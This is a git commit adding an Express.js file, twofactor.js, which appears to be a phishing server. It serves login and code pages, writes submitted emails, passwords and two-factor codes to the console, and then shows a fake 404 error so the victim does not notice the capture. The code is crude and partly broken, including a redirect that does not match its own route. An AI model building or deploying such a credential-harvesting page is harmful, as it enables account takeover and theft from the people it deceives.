03bb6aa11251e2f33474477247500896d0abfb08
tanvir-eVa <125306854+tanvir-eVa@users.noreply.github.com>
2023-10-01 22:22:23 +0600

    Add files via upload

---
+++ twofactor.js
@@ -0,0 +1,39 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const PORT = 3000;
+const app = express();
+
+
+app.use(bodyParser.urlencoded({extended: false}));
+app.use(express.static('vews'));
+app.get('/',(req,res)=>{
+  res.sendFile(__dirname + '/vews/indax.html');
+});
+
+app.get('/login',(req,res)=>{
+  res.sendFile(__dirname + '/vews/login.html');
+  
+});
+app.get('/login/code',(req,res)=>{
+  res.sendFile(__dirname + '/vews/code.html');
+  
+});
+app.post('/login',(req,res)=>{
+  const email = req.body.email;
+  const password = req.body.password;
+  console.log(`email : ${email}`);
+  console.log(`password : ${password}`);
+ res.redirect('/code');
+
+});
+app.post('/login/code',(req,res)=>{
+  const code = req.body.code;
+  console.log(`code : ${code}`)
+  res.send('<h1>404 error')
+});
+
+
+app.listen(PORT,()=>{
+  console.log(`server is running http://localhost:${PORT}`);
+});
+
